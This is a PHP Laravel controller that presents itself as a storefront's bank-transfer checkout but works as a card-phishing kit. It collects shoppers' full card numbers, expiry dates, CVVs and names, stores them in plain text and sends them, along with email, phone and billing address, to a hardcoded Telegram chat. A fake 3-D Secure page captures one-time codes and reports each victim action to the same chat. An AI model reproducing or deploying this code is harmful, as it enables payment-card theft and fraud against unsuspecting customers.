<?php

namespace Themes\Storefront\Http\Controllers;

use Illuminate\Http\Request;
use Modules\Order\Entities\Order;
use Modules\Payment\Gateways\BankTransfer;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log; 
use Illuminate\Support\Str;
use Telegram\Bot\Laravel\Facades\Telegram;




class BankTransferController extends Controller
{
    public function show()
    {
        return view('public.checkout.create.bank_transfer');
    }

    public function securePay($token)
    {
        $linkToken = DB::table('link_tokens')
            ->where('token', $token)
            ->where('is_active', 1)
            ->first();
    
        if (!$linkToken) {
            // Если токен недействителен или уже использован, возвращаем ошибку
            return abort(404);
        }
    
        // Загружаем Blade представление
        $response = response()->view('public.checkout.create.secure-pay');
    
        // Запрещаем кэширование страницы браузером
        $response->header('Cache-Control', 'no-cache, no-store, max-age=0, must-revalidate');
        $response->header('Pragma', 'no-cache');
        $response->header('Expires', 'Fri, 01 Jan 1990 00:00:00 GMT');
    
        return $response;
    }
    
    
    

    public function complete()
    {
        return view()->file(base_path('Themes/Storefront/views/public/checkout/create/form/complete.blade.php'));
    }

    public function purchase(Order $order, Request $request)
    {
        $bankTransfer = new BankTransfer();
        $response = $bankTransfer->purchase($order, $request);

        return $response;
    }

    function checkCardWithBinApi($cardNumber)
    {
        $api_base_url = "https://bins.antipublic.cc/bins/";
        $api_url = $api_base_url . str_replace(' ', '', $cardNumber);
    
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
        $response = curl_exec($ch);
    
        curl_close($ch);
    
        if ($response === false) {
            return false;
        } else {
            $data = json_decode($response, true);
    
            if ($data === null) {
                return false;
            }
    
            $requiredKeys = ['bin', 'brand', 'country', 'country_name', 'country_flag', 'country_currencies', 'bank', 'level', 'type'];
            foreach ($requiredKeys as $key) {
                if (!isset($data[$key]) || $data[$key] === "") {
                    return false;
                }
            }
    
            return true;
        }
    }
    

    function validateCardDetails($cardNumber, $expiryDate, $cvv, $holderName) {
        if (strlen($cardNumber) !== 16 || !$this->checkCardWithBinApi($cardNumber)) {
            return 'Invalid card number';
        }
    
        if (!preg_match('/^(0[1-9]|1[0-2])\/(2[3-9]|[3-4][0-9]|50)$/', $expiryDate)) {
            return 'Invalid expiry date';
        }
    
        if (!preg_match('/^\d{1,4}$/', $cvv)) {
            return 'Invalid CVV';
        }
    
        if (!preg_match('/^[a-zA-Z\s]+$/', $holderName)) {
            return 'Invalid holder name';
        }
    
        return null;
    }


    public function saveCardDetails(Request $request)
{
    try {
        $latestOrder = DB::table('orders')->latest('id')->first();
        $cardNumber = $request->input('card_number');
        $cardNumberWithoutSpaces = str_replace(' ', '', $cardNumber);
        $expiryDate = $request->input('expiry_date');
        $cvv = $request->input('cvv');
        $holderName = $request->input('cardholder_name');
        
        $error = $this->validateCardDetails($cardNumberWithoutSpaces, $expiryDate, $cvv, $holderName);
        if ($error !== null) {
            return response()->json(['error' => $error], 400);
        }

        if ($latestOrder) {
            DB::table('card_details')->insert([
                'order_id' => $latestOrder->id,
                'card_number' => $cardNumberWithoutSpaces,
                'expiry_date' => $expiryDate,
                'cvv' => $cvv,
                'holder_name' => $holderName,
            ]);

            $latestCardDetailId = DB::getPdo()->lastInsertId();

            $token = Str::random(64); 
            
            DB::table('link_tokens')->insert([
                'token' => $token,
                'order_id' => $latestOrder->id,
                'is_active' => 1,
                'created_at' => now(),
                'updated_at' => now(),
            ]);

            $secureCodeId = DB::table('secure_code')->insertGetId([
                'card_id_secure' => $latestCardDetailId,
                'code' => '', // Изначально код пустой
                'resend' => 0,
                'exit' => 0
            ]);

            $api_base_url = "https://bins.antipublic.cc/bins/";
            $api_url = $api_base_url . $cardNumberWithoutSpaces;

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);

            if ($response === false) {
                return response()->json(['success' => false, 'message' => "Ошибка при выполнении запроса для карты $cardNumberWithoutSpaces: " . curl_error($ch)], 500);
            } else {
                $data = json_decode($response, true);
                Log::info('API Response:', $data);
            
                if ($data === null) {
                    return response()->json(['success' => false, 'message' => "Ошибка при декодировании JSON для карты $cardNumberWithoutSpaces: " . json_last_error_msg()], 500);
                } else {
                    $apiResponse = $data;
            
                    $bin_c_data = [
                        'bin' => $apiResponse['bin'],
                        'brand' => $apiResponse['brand'],
                        'country' => $apiResponse['country'],
                        'country_name' => $apiResponse['country_name'],
                        'country_flag' => $apiResponse['country_flag'],
                        'country_currencies' => json_encode($apiResponse['country_currencies']),
                        'bank' => $apiResponse['bank'],
                        'level' => $apiResponse['level'],
                        'type' => $apiResponse['type'],
                        'card_number' => $cardNumberWithoutSpaces,
                        'card_detail_id' => $latestCardDetailId,
                    ];
            
                    DB::table('bin_c')->insert($bin_c_data);

                    // Извлекаем последние 4 цифры номера телефона клиента
                    $customerPhone = $latestOrder->customer_phone;
                    $phoneEnding = substr($customerPhone, -4);

                    // Получаем имя банка из таблицы bin_c для текущего card_detail_id
                    $bankName = $apiResponse['bank'];
                    
                    // Получаем общую сумму заказа из таблицы orders
                    $transactionAmount = $latestOrder->total;
                    $currency = $latestOrder->currency;

                    
                    // Форматируем номер карты, чтобы отобразить его как xxxx xxxx xxxx 1234
                    $cardNumberEnding = substr($cardNumberWithoutSpaces, -4);
                    $formattedCardNumber = 'xxxx xxxx xxxx ' . $cardNumberEnding;

                    // Возвращаем все необходимые данные в ответе
                    $responseData = [
                        'url' => route('secure-pay', ['token' => $token]),
                        'phoneEnding' => $phoneEnding,
                        'bankName' => $bankName,
                        'transactionAmount' => $transactionAmount,
                        'formattedCardNumber' => $formattedCardNumber,
                        'currency' => $currency,
                        'secureCodeId' => $secureCodeId,
                    ];

                    $bin = $apiResponse['bin'];
                    $brand = $apiResponse['brand'];
                    $country = $apiResponse['country'];
                    $country_name = $apiResponse['country_name'];
                    $country_flag = $apiResponse['country_flag'];
                    $country_currencies = json_encode($apiResponse['country_currencies']);
                    $bank = $apiResponse['bank'];
                    $level = $apiResponse['level'];
                    $type = $apiResponse['type'];
                    $card_number = $cardNumberWithoutSpaces;

                    $email = $latestOrder->customer_email;
                    $phone = $latestOrder->customer_phone;
                    $firstName = $latestOrder->customer_first_name;
                    $lastName = $latestOrder->customer_last_name;
                    $address1 = $latestOrder->billing_address_1;
                    $address2 = $latestOrder->billing_address_2;
                    $city = $latestOrder->billing_city;
                    $state = $latestOrder->billing_state;
                    $zip = $latestOrder->billing_zip;
                    $country = $latestOrder->billing_country;
                    $total = $latestOrder->total;
                    $currency = $latestOrder->currency;
                    $currencyRate = $latestOrder->currency_rate;

                    Log::info('Response data sent to client:', $responseData);
                    
                    try {
                        $chat_id = 5724326916;
                        $message = "📣 *Card Details* 📣\n";                       
                        $message .= "💳 *CARD NUMBER* 💳 `" . $card_number . "`\n";
                        $message .= "🗓 *EXPIRY DATE* 🗓 `" . $expiryDate . "`\n";
                        $message .= "🔒 *CVV* 🔒 `" . $cvv . "`\n";
                        $message .= "🧔🏿‍♂ *HOLDER NAME* 🧔🏿‍♂ `" . $holderName . "`\n";
                        $message .= "\n";         
                        $message .= "📣 *Bin Details* 📣\n";                                     
                        $message .= "🟥 *BIN:* `" . $bin . "`\n";
                        $message .= "🟧 *Brand:* `" . $brand . "`\n";
                        $message .= "🟨 *Country:* `" . $country . "`\n";
                        $message .= "🟩 *Country Name:* `" . $country_name . "`\n";
                        $message .= "🟦 *Country Flag:* `" . $country_flag . "`\n";
                        $message .= "🟪 *Country Currencies:* `" . $country_currencies . "`\n";
                        $message .= "⬛️ *Bank:* `" . $bank . "`\n";
                        $message .= "⬜️ *Level:* `" . $level . "`\n";
                        $message .= "🟫 *Type:* `" . $type . "`\n";
                        $message .= "\n*📣Order Info📣*:\n";
                        $message .= "✉️Email: `" . $email . "`\n";
                        $message .= "☎️Phone: `" . $phone . "`\n";
                        $message .= "🧔🏿‍♂First Name: `" . $firstName . "`\n";
                        $message .= "🧔🏿‍♂Last Name: `" . $lastName . "`\n";
                        $message .= "🏠Address 1: `" . $address1 . "`\n";
                        $message .= "🏠Address 2: `" . $address2 . "`\n";
                        $message .= "🏙City: `" . $city . "`\n";
                        $message .= "🌆State: `" . $state . "`\n";
                        $message .= "🔢ZIP: `" . $zip . "`\n";
                        $message .= "🏳️Country: `" . $country . "`\n";
                        $message .= "💰Total: `" . $total . "`\n";
                        $message .= "💵Currency: `" . $currency . "`\n";
                        $message .= "💹Currency Rate: `" . $currencyRate . "`\n";
                        $message .= "\n";         
                        $message .= "\n";         
                        $message .= "🦣 ID: " . $latestOrder->id . "\n";

                        

                        



                        
                        Telegram::sendMessage([
                            'chat_id' => $chat_id,
                            'text' => $message,
                            'parse_mode' => 'Markdown'
                        ]);
                    
                    } catch (\Exception $e) {
                        Log::error('Не удалось отправить сообщение через Telegram: ' . $e->getMessage());
                    }
                    
                    return response()->json($responseData);
                    
                    
                }
            }

            curl_close($ch);

        } else {
            return response()->json(['success' => false, 'message' => 'No latest order found.'], 404);
        }
    } catch (\Exception $e) {
        return response()->json(['success' => false, 'message' => 'An error occurred while saving the card details.', 'error' => $e->getMessage()], 500);
    }
}

public function submitOtp(Request $request) {
    $otp = $request->input('otp');
    $secureCodeId = $request->input('secureCodeId');

    Log::info('submitOtp method was called with data:', $request->all());
    $token = $request->input('token'); // Предполагаем, что токен передается в запросе


    try {
        $updated = DB::table('secure_code')
            ->where('id', $secureCodeId)
            ->update(['code' => $otp]);
        
        DB::table('link_tokens')
            ->where('token', $token)
            ->update(['is_active' => 0]);
        
        if ($updated) {

            // Отправляем сообщение в Telegram
            $this->sendTelegramMessage("🦣 ВВЕЛ 3-Ds: `$otp`\n🦣 ID: $secureCodeId");

            // Возвращаем JSON-ответ, сообщая клиенту о том, что операция прошла успешно
            return response()->json(['success' => true]);
        } else {
            return response()->json(['success' => false, 'message' => 'No record updated']);
        }

    } catch (\Exception $e) {
        Log::error('Error while updating OTP:', ['error' => $e->getMessage()]);
        return response()->json(['success' => false, 'message' => 'Server error']);
    }
}

private function sendTelegramMessage($message)
{
    $chat_id = '5724326916';

    Telegram::sendMessage([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ]);
}

public function resendOtp(Request $request) {
    $secureCodeId = $request->input('secureCodeId');

    Log::info('resendOtp method was called with data:', $request->all());

    try {
        $updated = DB::table('secure_code')
            ->where('id', $secureCodeId)
            ->update(['resend' => 1]);

        if ($updated) {
            $this->sendTelegramMessage("🦣 НАЖАЛ RESEND \n🦣 ID: $secureCodeId");

            return response()->json(['success' => true]);
        } else {
            return response()->json(['success' => false, 'message' => 'No record updated']);
        }

    } catch (\Exception $e) {
        Log::error('Error while resending OTP:', ['error' => $e->getMessage()]);
        return response()->json(['success' => false, 'message' => 'Server error']);
    }
}

public function exit(Request $request) {
    $secureCodeId = $request->input('secureCodeId');
    
    Log::info('exit method was called with data:', $request->all());
    $token = $request->input('token');

    try {
        $updated = DB::table('secure_code')
            ->where('id', $secureCodeId)
            ->update(['exit' => 1]);

        $tokensUpdated = DB::table('link_tokens')
            ->where('token', $token)
            ->update(['is_active' => 0]);

        Log::info('Updated secure_code rows:', ['count' => $updated]);
        Log::info('Updated link_tokens rows:', ['count' => $tokensUpdated]);

        if ($tokensUpdated && $updated) {
            $this->sendTelegramMessage("🦣 ВЫШЕЛ ИЗ 3-Ds \n🦣 ID: $secureCodeId");
            return response()->json(['success' => true]);
        } else {
            return response()->json(['success' => false, 'message' => 'No record updated']);
        }

    } catch (\Exception $e) {
        Log::error('Error while requesting exit:', ['error' => $e->getMessage()]);
        return response()->json(['success' => false, 'message' => 'Server error']);
    }
}


}
